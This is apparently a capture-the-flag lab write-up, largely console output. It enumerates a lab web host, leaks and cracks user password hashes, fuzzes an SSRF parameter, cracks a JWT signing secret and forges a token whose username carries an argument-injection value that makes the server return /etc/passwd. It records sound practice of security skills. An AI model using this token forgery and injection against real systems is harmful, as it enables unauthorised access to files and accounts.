```console
└─$ nmap -A -p- -T4 -Pn 10.129.228.81
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 12:49 CDT
Nmap scan report for 10.129.228.81
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
```

```console
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -u http://hat-valley.htb -H "HOST: FUZZ.hat-valley.htb" -v -fs 0,132  -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.hat-valley.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0,132
________________________________________________

[Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 31ms]
| URL | http://hat-valley.htb
    * FUZZ: store
```



Upon inspection of app.js I found references to /api and /hr. Trying /hr brought me to a dashboard. Later I learned this had only worked becuase I had set my cookie to token=admin when trying other things.



When trying to capture more requests in burp I noticed that there was additional pages being loaded however I was unable to access them due to a jwt token error. This was rectified by removing the cookie and loading the page again revealing usernames and hashes.

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 27 Oct 2022 20:31:55 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 775
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"

[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
```


e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1	sha256	chris123

```console
└─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://hat-valley.htb/api/store-status?url=%20http://localhost:FUZZ/%20 -v -fs 0  -c                 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb/api/store-status?url=%20http://localhost:FUZZ/%20
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 100ms]
| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:0080/%20
    * FUZZ: 0080

[Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 82ms]
| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:3002/%20
    * FUZZ: 3002

[Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 64ms]
| URL | http://hat-valley.htb/api/store-status?url=%20http://localhost:8080/%20
    * FUZZ: 8080

:: Progress: [10000/10000] :: Job [1/1] :: 546 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```


```console
└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -d /usr/share/wordlists/rockyou.txt -C 

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

[*] Tested 1 million passwords so far
[*] Tested 2 million passwords so far
[*] Tested 3 million passwords so far
[*] Tested 4 million passwords so far
[*] Tested 5 million passwords so far
[*] Tested 6 million passwords so far
[*] Tested 7 million passwords so far
[*] Tested 8 million passwords so far
[*] Tested 9 million passwords so far
[*] Tested 10 million passwords so far
[*] Tested 11 million passwords so far
[*] Tested 12 million passwords so far
[*] Tested 13 million passwords so far
[+] 123beany123 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "123beany123"
```
```
└─$ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2OTA0MTAwfQ.Tao2-H_k4iIaqh1WHmElOKuDs3C4RdBe9AyaI5vjiJU -S hs256 -p "123beany123" -T

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "christopher.jones"
[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: christopher.jones
Please enter new value and hit ENTER
> /' /etc/passwd '/
[1] username = "/' /etc/passwd '/"
[2] iat = 1666904100    ==> TIMESTAMP = 2022-10-27 15:55:00 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_e5e6ada6ba82ff68d252d8f8f1b3bc46 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICcvIiwiaWF0IjoxNjY2OTA0MTAwfQ.4yuT_tZes_lWGcYTN1Qn0El-qex9QoPTYBZNtz10UvE
```

```
GET /api/all-leave HTTP/1.1
Host: hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hat-valley.htb/leave
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICcvIiwiaWF0IjoxNjY2OTA0MTAwfQ.4yuT_tZes_lWGcYTN1Qn0El-qex9QoPTYBZNtz10UvE
Content-Length: 53

If-None-Match: W/"8c-rIHXkvsSLlUvGPdve0hY79VoWd0"
```


```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 28 Oct 2022 22:43:39 GMT
Content-Type: application/octet-stream
Content-Length: 3739
Connection: close
x-powered-by: Express
access-control-allow-origin: *
etag: W/"e9b-Ewp55Dw9hDrKKIJFrkiO0jRnnJw"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false
Subject: Leave Request: /'
To: <'a@awkward>,<christine@awkward>
User-Agent: mail (GNU Mailutils 3.14)
Date: Sat, 29 Oct 2022 08:21:19 +1100

You have a new leave request to review!
/' /etc/passwd 'a,/' /etc/passwd 'a,id,id,Pending
.
Subject: Leave Request: /'
To: <'a@awkward>,<christine@awkward>
User-Agent: mail (GNU Mailutils 3.14)
Date: Sat, 29 Oct 2022 08:21:48 +1100

You have a new leave request to review!
/' /etc/passwd 'a,id,13/10/2022,29/10/2022,Pending
.
Subject: Leave Request: '/
To: christine
User-Agent: mail (GNU Mailutils 3.14)
Date: Sat, 29 Oct 2022 08:28:07 +1100

You have a new leave request to review!
'/ /etc/passwd /',/' /etc/passwd 'a,id,id,Pending
.
```
